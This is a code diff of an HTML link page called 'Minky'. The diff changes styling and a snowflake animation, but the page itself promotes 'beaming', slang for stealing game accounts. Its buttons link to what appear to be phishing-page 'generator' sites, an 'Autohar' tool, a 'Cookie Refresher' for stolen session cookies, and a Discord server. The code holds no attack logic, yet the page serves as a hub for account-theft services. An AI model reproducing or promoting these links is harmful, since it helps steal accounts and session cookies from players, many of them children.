@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Minky</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     * {
       box-sizing: border-box;
@@ -19,18 +19,106 @@
       display: flex;
       align-items: center;
       justify-content: center;
+      flex-direction: column;
       min-height: 100vh;
-      overflow: hidden;
+      overflow-y: auto;
       position: relative;
+      padding: 40px 0;
     }
 
+    .container {
+      text-align: center;
+      animation: fadeIn 1.5s ease;
+    }
+
+    h1 {
+      font-family: 'Poppins', sans-serif;
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #aaa;
+      margin-bottom: 25px;
+    }
+
+    .link-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    a {
+      text-decoration: none;
+      color: white;
+      background: #222;
+      padding: 14px;
+      border: 1px solid #333;
+      border-radius: 10px;
+      transition: all 0.3s ease;
+      font-weight: bold;
+      width: 260px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    a:hover {
+      background: #fff;
+      color: black;
+      transform: scale(1.05);
+    }
+
+    .discord-special {
+      background-color: #222;
+      border: 1px solid #333;
+    }
+
+    .discord-special:hover {
+      background-color: #5865F2;
+      color: white;
+    }
+
+    .discord-icon {
+      width: 20px;
+      height: 20px;
+      filter: brightness(0) invert(1);
+      transition: filter 0.3s ease;
+    }
+
+    .discord-special:hover .discord-icon {
+      filter: brightness(0);
+    }
+
+    footer {
+      margin-top: 40px;
+      font-size: 0.8rem;
+      color: #555;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* Snowflake styles */
     .snowflake {
-      position: absolute;
+      position: fixed;
       top: -10px;
       color: white;
       font-size: 1em;
-      animation: fall linear infinite;
-      opacity: 0.8;
+      user-select: none;
+      pointer-events: none;
+      animation-name: fall;
+      animation-timing-function: linear;
     }
 
     @keyframes fall {
@@ -39,127 +127,44 @@
         opacity: 0;
       }
     }
-
-    .container {
-      text-align: center;
-      z-index: 10;
-      position: relative;
-    }
-
-    h1 {
-      font-family: 'Orbitron', sans-serif;
-      font-size: 2.4rem;
-      margin-bottom: 8px;
-    }
-
-    p {
-      color: #aaa;
-      margin-bottom: 30px;
-      white-space: pre-line;
-    }
-
-    .link-list {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 14px;
-    }
-
-    .link-button {
-      text-decoration: none;
-      color: white;
-      background: #222;
-      padding: 14px;
-      border-radius: 10px;
-      width: 280px;
-      font-weight: 600;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 10px;
-      position: relative;
-      transition: background-color 0.3s ease, transform 0.2s ease;
-    }
-
-    .link-button:hover {
-      background-color: white;
-      color: black;
-      transform: scale(1.05);
-    }
-
-    .discord-special {
-      background-color: #222;
-      border: 1px solid #333;
-      transition: background-color 0.3s ease;
-    }
-
-    .discord-special:hover {
-      background-color: #5865F2;
-    }
-
-    .discord-special:hover .discord-icon {
-      filter: brightness(0);
-      transform: scale(1.1);
-    }
-
-    .discord-icon {
-      width: 20px;
-      height: 20px;
-      filter: brightness(0) invert(1);
-      margin-right: 8px;
-      transition: transform 0.3s ease;
-    }
-
-    footer {
-      margin-top: 40px;
-      font-size: 0.8rem;
-      color: #555;
-    }
   </style>
 </head>
 <body>
 
-  <!-- Snowflakes Container -->
-  <script>
-    const snowCount = 60;
-    for (let i = 0; i < snowCount; i++) {
-      const snowflake = document.createElement("div");
-      snowflake.classList.add("snowflake");
-      snowflake.innerHTML = "❄";
-      snowflake.style.left = Math.random() * 100 + "vw";
-      snowflake.style.animationDuration = (5 + Math.random() * 5) + "s";
-      snowflake.style.fontSize = (10 + Math.random() * 14) + "px";
-      snowflake.style.animationDelay = Math.random() * 5 + "s";
-      document.body.appendChild(snowflake);
-    }
-  </script>
-
   <div class="container">
     <h1>Minky</h1>
-    <p>Best Beaming Sites/Methods/Tools/Tutorials 👾
-Join Our Discord For The Full Beaming Experience 👾</p>
+    <p>Best Beaming Sites/Methods/Tools/Tutorials 👾<br>
+    Join Our Discord For The Full Beaming Experience 👾</p>
 
     <div class="link-list">
-      <a href="https://www.logged.tg/auth/minkybeams" class="link-button" target="_blank">
-        Main Generator Site
-      </a>
-      <a href="https://roblox.tg/dashboard/?code=NjU5MTUxMzEwNzc3ODI3Nzc1MV85OTcxODE4OTgyODA4ODQwMjQ=" class="link-button" target="_blank">
-        Immortal (Generator 2)
-      </a>
-      <a href="https://is.gd/bhAW9Q" class="link-button" target="_blank">
-        Autohar
-      </a>
-      <a href="https://dropref.com/?https://www.logged.tg/tools/refresher" class="link-button" target="_blank">
-        Cookie Refresher
-      </a>
-      <a href="https://discord.gg/kPeNP5aJTK" class="link-button discord-special" target="_blank">
-        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" class="discord-icon">
+      <a href="https://www.logged.tg/auth/minkybeams" target="_blank">Main Generator Site</a>
+      <a href="https://roblox.tg/dashboard/?code=NjU5MTUxMzEwNzc3ODI3Nzc1MV85OTcxODE4OTgyODA4ODQwMjQ=" target="_blank">Immortal (Generator 2)</a>
+      <a href="https://is.gd/bhAW9Q" target="_blank">Autohar</a>
+      <a href="https://dropref.com/?https://www.logged.tg/tools/refresher" target="_blank">Cookie Refresher</a>
+      <a href="https://discord.gg/kPeNP5aJTK" target="_blank" class="discord-special">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" alt="Discord" class="discord-icon">
         Discord Server
       </a>
     </div>
 
     <footer>© 2025 Minky</footer>
   </div>
+
+  <script>
+    // Snowflake generator
+    setInterval(() => {
+      const snowflake = document.createElement("div");
+      snowflake.classList.add("snowflake");
+      snowflake.innerText = "❄";
+      snowflake.style.left = Math.random() * 100 + "vw";
+      snowflake.style.animationDuration = 5 + Math.random() * 5 + "s";
+      snowflake.style.fontSize = Math.random() * 10 + 10 + "px";
+      document.body.appendChild(snowflake);
+      setTimeout(() => {
+        snowflake.remove();
+      }, 10000);
+    }, 200);
+  </script>
 
 </body>
 </html>
